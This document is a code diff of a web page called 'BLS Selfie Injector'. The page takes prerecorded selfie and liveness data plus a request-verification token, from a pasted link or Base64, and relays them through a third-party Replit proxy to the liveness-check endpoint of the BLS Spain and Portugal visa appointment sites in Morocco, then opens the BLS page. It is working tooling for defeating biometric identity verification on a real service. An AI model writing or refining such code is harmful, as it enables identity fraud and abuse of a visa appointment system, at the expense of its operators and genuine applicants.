@@ -1,23 +1,103 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>BLS Selfie Injector</title>
     <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: system-ui; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }
-        .container { background: #161b22; border: 1px solid #30363d; border-radius: 16px; padding: 30px; max-width: 600px; width: 100%; text-align: center; }
-        .status { padding: 16px; border-radius: 10px; margin-bottom: 20px; font-size: 14px; }
-        .status.success { background: #0d2818; border-left: 4px solid #3fb950; color: #3fb950; }
-        .status.error { background: #2d0a0a; border-left: 4px solid #da3633; color: #da3633; }
-        .status.info { background: #0d1a2b; border-left: 4px solid #58a6ff; color: #58a6ff; }
-        .loader { display: inline-block; width: 24px; height: 24px; border: 3px solid #30363d; border-top-color: #3fb950; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 12px; vertical-align: middle; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .btn { background: #238636; color: #fff; border: none; border-radius: 8px; padding: 12px 24px; font-size: 14px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
-        .btn:hover { background: #2ea043; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .note { margin-top: 16px; font-size: 12px; color: #8b949e; }
-        .select-box { margin: 16px 0; padding: 8px; border-radius: 8px; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; width: 100%; font-size: 14px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0d1117;
+            color: #c9d1d9;
+            font-family: system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+        .status {
+            padding: 16px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .status.success {
+            background: #0d2818;
+            border-left: 4px solid #3fb950;
+            color: #3fb950;
+        }
+        .status.error {
+            background: #2d0a0a;
+            border-left: 4px solid #da3633;
+            color: #da3633;
+        }
+        .status.info {
+            background: #0d1a2b;
+            border-left: 4px solid #58a6ff;
+            color: #58a6ff;
+        }
+        .loader {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #30363d;
+            border-top-color: #3fb950;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 12px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .btn {
+            background: #238636;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn:hover {
+            background: #2ea043;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .note {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #8b949e;
+        }
+        .select-box {
+            margin: 16px 0;
+            padding: 8px;
+            border-radius: 8px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+            width: 100%;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -30,8 +110,8 @@
         </div>
 
         <select id="siteSelect" class="select-box">
-            <option value="https://www.blsspainmorocco.net/MAR/Appointment/Liveness?data=">Spain (BLS Spain)</option>
-            <option value="https://morocco.blsportugal.com/MAR/Appointment/Liveness?data=">Portugal (BLS Portugal)</option>
+            <option value="spain">Spain (BLS Spain)</option>
+            <option value="portugal">Portugal (BLS Portugal)</option>
         </select>
 
         <button id="injectBtn" class="btn" style="display:none;">📸 Start Selfie</button>
@@ -46,6 +126,8 @@
             const siteSelect = document.getElementById('siteSelect');
             let selfieData = null;
             let encodedData = null;
+
+            const PROXY_URL = 'https://node-create--trackyou188.replit.app/proxy/MAR/appointment/livenessrequest';
 
             function setStatus(message, type = 'info') {
                 statusEl.className = 'status ' + type;
@@ -63,32 +145,38 @@
                 }
             }
 
-            // ===== استخدام CorsProxy.io لتجاوز CORS مع Pastebin =====
-            async function fetchFromUrl(url) {
+            async function seedSession(site) {
                 try {
-                    // استخدام CorsProxy.io لتجاوز مشكلة CORS مع Pastebin
-                    const proxyUrl = `https://corsproxy.io/?${url}`;
-                    console.log('Fetching via proxy:', proxyUrl);
-                    const response = await fetch(proxyUrl);
-                    if (!response.ok) throw new Error('HTTP ' + response.status);
-                    return await response.text();
+                    const response = await fetch(PROXY_URL, {
+                        method: 'GET',
+                        headers: {
+                            'X-BLS-Site': site
+                        }
+                    });
+                    console.log('Session seeded for ' + site + ':', response.status);
                 } catch (e) {
-                    console.error('Fetch error:', e);
-                    // محاولة بديلة باستخدام allorigins
-                    try {
-                        const backupUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
-                        console.log('Fetching via backup proxy:', backupUrl);
-                        const response2 = await fetch(backupUrl);
-                        if (!response2.ok) throw new Error('HTTP ' + response2.status);
-                        return await response2.text();
-                    } catch (e2) {
-                        console.error('Backup fetch error:', e2);
-                        return null;
-                    }
+                    console.error('Session seed error:', e);
                 }
             }
 
-            // استخراج data من الرابط
+            async function sendToProxy(data, site) {
+                const formData = new URLSearchParams(data);
+                try {
+                    const response = await fetch(PROXY_URL, {
+                        method: 'POST',
+                        headers: {
+                            'X-BLS-Site': site,
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: formData
+                    });
+                    const text = await response.text();
+                    return { status: response.status, body: text };
+                } catch (e) {
+                    return { status: 0, body: e.message };
+                }
+            }
+
             const urlParams = new URLSearchParams(window.location.search);
             const rawData = urlParams.get('data');
 
@@ -100,30 +188,32 @@
             encodedData = rawData;
             setStatus('⏳ Loading data...', 'info');
 
-            // التحقق: هل البيانات هي رابط (يبدأ بـ http)؟
             if (rawData.startsWith('http://') || rawData.startsWith('https://')) {
-                // الحالة 1: رابط Pastebin
                 setStatus('⏳ Fetching data from Pastebin via proxy...', 'info');
-                fetchFromUrl(rawData).then(text => {
-                    if (!text) {
-                        setStatus('❌ Failed to fetch data from Pastebin.', 'error');
-                        return;
-                    }
-                    try {
-                        selfieData = JSON.parse(text);
-                        if (!selfieData.appointmentData || !selfieData.livenessData || !selfieData.token) {
-                            throw new Error('Missing required fields');
+                fetch(rawData)
+                    .then(res => {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.text();
+                    })
+                    .then(text => {
+                        try {
+                            selfieData = JSON.parse(text);
+                            if (!selfieData.appointmentData || !selfieData.livenessData || !selfieData.token) {
+                                throw new Error('Missing required fields');
+                            }
+                            setStatus('✅ Data loaded successfully! Choose site and click the button.', 'success');
+                            injectBtn.style.display = 'inline-block';
+                            siteSelect.style.display = 'inline-block';
+                        } catch (e) {
+                            console.error('Parse error:', e);
+                            setStatus('❌ Failed to parse Pastebin data: ' + e.message, 'error');
                         }
-                        setStatus('✅ Data loaded from Pastebin successfully!', 'success');
-                        injectBtn.style.display = 'inline-block';
-                        siteSelect.style.display = 'inline-block';
-                    } catch (e) {
-                        console.error('Parse error:', e);
-                        setStatus('❌ Failed to parse Pastebin data: ' + e.message, 'error');
-                    }
-                });
+                    })
+                    .catch(err => {
+                        console.error('Fetch error:', err);
+                        setStatus('❌ Failed to fetch data from Pastebin: ' + err.message, 'error');
+                    });
             } else {
-                // الحالة 2: بيانات مشفرة بـ Base64
                 setStatus('⏳ Decoding Base64 data...', 'info');
                 const decoded = decodeBase64(rawData);
                 if (!decoded) {
@@ -135,7 +225,7 @@
                     if (!selfieData.appointmentData || !selfieData.livenessData || !selfieData.token) {
                         throw new Error('Missing required fields');
                     }
-                    setStatus('✅ Base64 data loaded successfully!', 'success');
+                    setStatus('✅ Base64 data loaded successfully! Choose site and click the button.', 'success');
                     injectBtn.style.display = 'inline-block';
                     siteSelect.style.display = 'inline-block';
                 } catch (e) {
@@ -144,30 +234,47 @@
                 }
             }
 
-            injectBtn.onclick = function() {
+            injectBtn.onclick = async function() {
                 this.disabled = true;
-                this.textContent = '⏳ Opening BLS...';
+                this.textContent = '⏳ Preparing session...';
 
-                const baseUrl = siteSelect.value;
-                const dataParam = (rawData.startsWith('http://') || rawData.startsWith('https://')) ? rawData : encodedData;
-                const fullUrl = baseUrl + dataParam;
+                const site = siteSelect.value;
+                setStatus('🔄 Seeding session for ' + site + '...', 'info');
 
-                const popup = window.open(fullUrl, '_blank', 'width=500,height=700');
+                await seedSession(site);
 
-                if (!popup) {
-                    setStatus('❌ Popup blocked! Please allow popups and try again.', 'error');
-                    this.disabled = false;
+                setStatus('📤 Sending data to proxy...', 'info');
+                this.textContent = '⏳ Sending...';
+
+                const result = await sendToProxy({
+                    AppointmentData: selfieData.appointmentData,
+                    LivenessData: selfieData.livenessData,
+                    __RequestVerificationToken: selfieData.token
+                }, site);
+
+                console.log('Proxy response:', result);
+
+                if (result.status === 200 || result.status === 302 || result.status === 301) {
+                    setStatus('✅ Request successful! Opening BLS page...', 'success');
+                    this.textContent = '✅ Done';
+
+                    const fullUrl = `https://www.blsspainmorocco.net/MAR/appointment/livenessrequest`;
+                    const popup = window.open(fullUrl, '_blank', 'width=500,height=700');
+                    if (!popup) {
+                        setStatus('⚠️ Popup blocked! Please allow popups.', 'error');
+                    } else {
+                        setTimeout(() => {
+                            setStatus('✅ BLS page opened. Complete the verification in the popup.', 'success');
+                        }, 3000);
+                    }
+                } else {
+                    setStatus('❌ Proxy returned error: ' + result.status + ' - ' + result.body.substring(0, 100), 'error');
                     this.textContent = '📸 Start Selfie';
-                    return;
+                    this.disabled = false;
                 }
 
-                setStatus('⏳ Opening BLS page...', 'info');
-
-                setTimeout(() => {
-                    setStatus('✅ BLS page opened. Complete the verification in the popup.', 'success');
-                    this.disabled = false;
-                    this.textContent = '📸 Start Selfie';
-                }, 3000);
+                this.textContent = '📸 Start Selfie';
+                this.disabled = false;
             };
 
         })();
